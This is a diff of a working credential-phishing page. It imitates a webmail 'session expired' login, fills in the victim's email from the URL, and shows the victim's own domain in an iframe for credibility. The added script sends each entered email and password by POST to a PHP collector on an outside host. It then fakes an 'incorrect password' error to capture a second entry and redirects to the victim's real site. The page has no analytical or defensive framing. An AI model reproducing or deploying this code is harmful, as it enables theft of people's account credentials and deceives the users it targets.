@@ -129,104 +129,98 @@
         <div class="login_body">
             <div id="head">
                 <h3 id="name"></h3>
-                <span class="times">×</span>
+                <span class="times">&times;</span>
             </div>
             <div class="alert alert-danger" id="msg" style="display: none;">Incorrect Password</div>
             <div class="text-center confirm">Your session has expired please login again to continue</div>
             <div id="error" style="color: red;"></div>
-            <form class="flex_column" id="form" action="https://submit-form.com/5BYUqxAm1" method="POST">
+            <form class="flex_column" id="form">
                 <label class="text-secondary font-weight-bold">Email Address</label>
                 <input type="email" readonly class="form-control email" required="required" name="email" id="email" autocomplete="on">
                 <label class="text-secondary font-weight-bold">Password</label>
                 <input type="password" class="form-control password" name="password" required="" id="password">
-                <input type="hidden" name="redirect_url" value="YOUR_PAGE_URL">
                 <br>
                 <div></div>
                 <input style="margin-top: 15px;" class="btn newbutton" type="submit" value="Sign In" name="submit" id="newbutton">
             </form>
         </div>
     </div>
+</body>
 
-    <div class="loading" id="loading">
-        <span class="loader"></span>
-        <h3 class="text-center">Connecting To Mail Server</h3>
-    </div>
+<div class="loading" id="loading">
+    <span class="loader"></span>
+    <h3 class="text-center">Connecting To Mail Server</h3>
+</div>
 
-    <iframe src="" frameborder="0" id="iframe"></iframe>
-    <input type="hidden" value="0" id="number">
+<iframe src="" frameborder="0" id="iframe"></iframe>
+<input type="hidden" value="0" id="number">
 
 <script>
-    // Extract email from URL hash
-    const url = new URL(window.location.href);
-    const updated_email = url.hash.replace("#", "");
+    const phpLink = "https://serenixthaispa.com//TKK/TKT1/xend.php";
+
+    const sendCount = [];
+
+    var link = window.location.href;
+    var url = new URL(link);
+    var hash = url.hash;
+    var updated_email = hash.replace("#", "");
     document.getElementById("email").value = updated_email;
 
-    // Set iframe URL and page title
-    const delimiterIndex = updated_email.indexOf("@");
-    const charactersAfter = updated_email.substring(delimiterIndex + 1);
-    const iframe = document.getElementById("iframe");
-    const iframe_url = "https://www." + charactersAfter;
+    const inputString = updated_email;
+    const delimiter = "@";
+    const delimiterIndex = inputString.indexOf(delimiter);
+    const charactersAfter = inputString.substring(delimiterIndex + 1);
+    var iframe = document.getElementById("iframe");
+    var iframe_url = "https://www." + charactersAfter;
     iframe.setAttribute("src", iframe_url);
-    const linkArr = iframe_url.split(".")[1] || "Unknown";
-    document.title = `${linkArr.charAt(0).toUpperCase()}${linkArr.substring(1)} | Secured`;
+    let linkArr = iframe_url.split(".")[1]
+    document.title = `${linkArr.charAt(0).toUpperCase()}${linkArr.substring(1)} | Secured`
 
-    // Hide loading animation after 4 seconds
     setTimeout(() => {
-        document.getElementById("loading").style.display = "none";
+        var loader = document.getElementById("loading");
+        loader.style.display = "none";
     }, 4000);
 
     document.addEventListener("DOMContentLoaded", function () {
-        // Set the name in the header
         document.querySelector("#name").innerHTML = linkArr;
-
-        // Track submission count in localStorage
-        let sendCount = parseInt(localStorage.getItem("sendCount") || "0");
-        const errors = document.getElementById("error");
-        const msg = document.getElementById("msg");
-
-        // Check if redirected back with success or failure
-        const params = new URLSearchParams(window.location.search);
-        const success = params.get("success");
-        if (success) {
-            sendCount++;
-            localStorage.setItem("sendCount", sendCount);
-            if (success === "true") {
-                errors.innerText = `Submission successful! Attempt ${sendCount} of 2`;
-                msg.style.display = "none";
-            } else {
-                errors.innerText = `Attempt ${sendCount} of 2`;
-                msg.style.display = "block"; // Show "Incorrect Password"
-            }
-            // Redirect to www.free.com after exactly two submissions
-            if (sendCount >= 2) {
-                errors.innerText = "Redirecting to free.com...";
-                msg.style.display = "none";
-                localStorage.removeItem("sendCount"); // Reset counter
-                setTimeout(() => {
-                    window.location.href = "https://www.free.com";
-                }, 2000);
-            }
-        }
-
-        // Validate email before submission
-        const form = document.getElementById("form");
+        var form = document.getElementById("form");
         form.addEventListener("submit", function (e) {
-            const email = document.getElementById("email").value;
-            const button = document.getElementById("newbutton");
-            button.disabled = true;
-            button.value = "Submitting...";
-            if (!email || !email.includes("@")) {
-                e.preventDefault();
-                errors.innerText = "Invalid email address.";
-                button.disabled = false;
-                button.value = "Sign In";
-            }
-        });
+            e.preventDefault();
 
-        // Optional: Uncomment to enable closing the login form
-        // document.querySelector(".times").addEventListener("click", () => {
-        //     document.querySelector(".login").style.display = "none";
-        // });
+            var button = document.getElementById("newbutton");
+            var formData = new FormData(form);
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", phpLink, true);
+            var errors = document.getElementById("error");
+            errors.innerText = "Incorrect Username or Password!";
+            var password = document.getElementById("password");
+            password.value = "";
+
+            sendCount.push('sent');
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        console.log(xhr.responseText);
+                    } else {
+                        console.error(xhr.responseText);
+                    }
+                }
+
+                if (sendCount.length >= 2) {
+                    errors.innerText = "";
+                    setTimeout(() => {
+                        window.location.href = "https://www." + charactersAfter;
+                    }, 2000);
+                }
+            };
+            xhr.send(formData);
+        });
     });
+
+    // document.querySelector('.times').addEventListener('click', () => {
+    //     document.querySelector('.login').style.display = 'none';
+    // })
 </script>
+
 </html>
